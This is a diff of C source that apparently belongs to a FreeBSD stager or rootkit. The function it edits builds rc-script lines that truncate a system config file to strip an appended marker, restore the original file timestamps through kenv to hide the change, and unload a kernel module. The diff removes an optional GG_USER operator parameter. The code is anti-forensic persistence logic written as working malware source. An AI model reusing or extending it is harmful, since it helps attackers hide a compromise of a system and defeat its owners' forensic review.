@@ -11,7 +11,7 @@
 // idea is we create a marker beforehand so we know where to cut off
 // after we truncate we restore times using kenv
 static
-void rcblock_build (char* buf, size len, size modulelen, const char* tmp, const char* tmpname, const char* op)
+void rcblock_build (char* buf, size len, size modulelen, const char* tmp, const char* tmpname)
 {
 	int off = snprintf(buf, len,
 	    "# lol\n"
@@ -20,9 +20,6 @@ void rcblock_build (char* buf, size len, size modulelen, const char* tmp, const 
 	    "/usr/bin/truncate -s %jd " CFG_ROOT_FILE "\n",
 	    (uintmax_t)(modulelen+RMAGIC_LEN), (uintmax_t)modulelen, tmp,
 	    (intmax_t)stager_times[0].sb.st_size);
-
-	if (op!=NULL && op[0]!='\0')
-		off += snprintf(buf+off, len-off, "/bin/kenv -q GG_USER=%s >/dev/null\n", op);
 
 	// pass original times through kenv
 	for (size i=0; i<NSTAGER_TIMES; i++) {
@@ -46,8 +43,6 @@ void rcblock_build (char* buf, size len, size modulelen, const char* tmp, const 
 		off += snprintf(buf+off, len-off, "/bin/kenv -q -u %s >/dev/null\n", t->km);
 		off += snprintf(buf+off, len-off, "/bin/kenv -q -u %s >/dev/null\n", t->kc);
 	}
-
-	off += snprintf(buf+off, len-off, "/bin/kenv -q -u GG_USER >/dev/null\n");
 
 	off += snprintf(buf+off, len-off,
 	    "/sbin/kldunload %s\n"
